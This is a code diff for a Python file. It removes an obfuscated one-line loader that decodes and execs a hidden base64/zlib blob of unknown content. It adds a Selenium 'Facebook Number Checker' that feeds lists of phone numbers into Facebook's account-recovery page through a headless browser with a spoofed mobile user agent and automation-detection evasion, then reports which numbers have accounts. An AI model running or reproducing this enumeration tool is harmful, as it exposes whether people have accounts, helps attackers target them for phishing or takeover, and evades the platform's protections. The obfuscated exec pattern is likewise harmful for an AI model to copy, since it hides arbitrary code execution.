@@ -1,2 +1,155 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'==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'))
+import sys
+import signal
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+import time
+
+# Global variables for drivers
+driver1 = None
+driver2 = None
+
+def signal_handler(sig, frame):
+    global driver1, driver2
+    print("\n\nProgram is shutting down...")
+    try:
+        if driver1:
+            driver1.quit()
+    except:
+        pass
+    try:
+        if driver2:
+            driver2.quit()
+    except:
+        pass
+    sys.exit(0)
+
+def check_facebook_number(driver, number):
+    try:
+        driver.get("https://limited.facebook.com/login/identify/")
+        time.sleep(0.1)
+
+        try:
+            input_box = WebDriverWait(driver, 3).until(
+                EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='email'], input[type='text']"))
+            )
+        except:
+            return f"{number} - 🖕"
+        
+        input_box.click()
+        input_box.clear()
+        input_box.send_keys(number)
+        input_box.send_keys("\n")
+        
+        try:
+            submit_button = driver.find_element(By.CSS_SELECTOR, "input[type='submit'], button")
+            submit_button.click()
+        except:
+            pass
+
+        time.sleep(0.8)
+
+        page_content = driver.page_source.lower()
+        current_url = driver.current_url
+        
+        is_account_present = (
+            "choose a way" in page_content or 
+            "try entering your password" in page_content or 
+            "try another way" in page_content or 
+            "password" in page_content or
+            "identify" not in current_url
+        )
+
+        if is_account_present:
+            return f"{number} - ✅"
+        else:
+            return f"{number} - 🖕"
+
+    except Exception as e:
+        return f"{number} - 🖕"
+
+print("--- Facebook Number Checker ---\n")
+
+numbers_to_check = []
+
+signal.signal(signal.SIGINT, signal_handler)
+
+while True:
+    try:
+        user_input = input().strip()
+        
+        if user_input.lower() == 'exit':
+            if numbers_to_check:
+                break
+            else:
+                print("No numbers entered. Exiting...")
+                sys.exit()
+        
+        if user_input:
+            numbers_to_check.append(user_input)
+        else:
+            if numbers_to_check:
+                break
+        
+    except KeyboardInterrupt:
+        print("\nProgram stopped by user.")
+        sys.exit()
+
+chrome_options = Options()
+chrome_options.add_argument("--no-sandbox")
+chrome_options.add_argument("--disable-dev-shm-usage")
+chrome_options.add_argument("--disable-blink-features=AutomationControlled")
+chrome_options.add_argument("--headless")
+chrome_options.add_argument("--disable-gpu")
+chrome_options.add_argument("--single-process")
+chrome_options.add_argument("--disable-extensions")
+chrome_options.add_argument("--disable-sync")
+chrome_options.add_argument("user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1")
+chrome_options.add_argument("--window-size=375,667")
+
+prefs = {
+    "profile.managed_default_content_settings.images": 2,
+    "profile.managed_default_content_settings.stylesheets": 2,
+    "profile.managed_default_content_settings.fonts": 2,
+    "profile.managed_default_content_settings.media": 2
+}
+chrome_options.add_experimental_option("prefs", prefs)
+
+print("Checking Started\n")
+
+results = []
+
+try:
+    service = Service("/data/data/com.termux/files/usr/bin/chromedriver")
+    driver1 = webdriver.Chrome(service=service, options=chrome_options)
+    driver2 = webdriver.Chrome(service=service, options=chrome_options)
+    
+    for i, number in enumerate(numbers_to_check):
+        current_driver = driver1 if i % 2 == 0 else driver2
+        result = check_facebook_number(current_driver, number)
+        results.append(result)
+        print(result)
+    
+    print("\n" + "="*40)
+    print("FINAL RESULTS")
+    print("="*40 + "\n")
+    for result in results:
+        print(result)
+    
+    driver1.quit()
+    driver2.quit()
+
+except Exception as e:
+    try:
+        if driver1:
+            driver1.quit()
+    except:
+        pass
+    try:
+        if driver2:
+            driver2.quit()
+    except:
+        pass
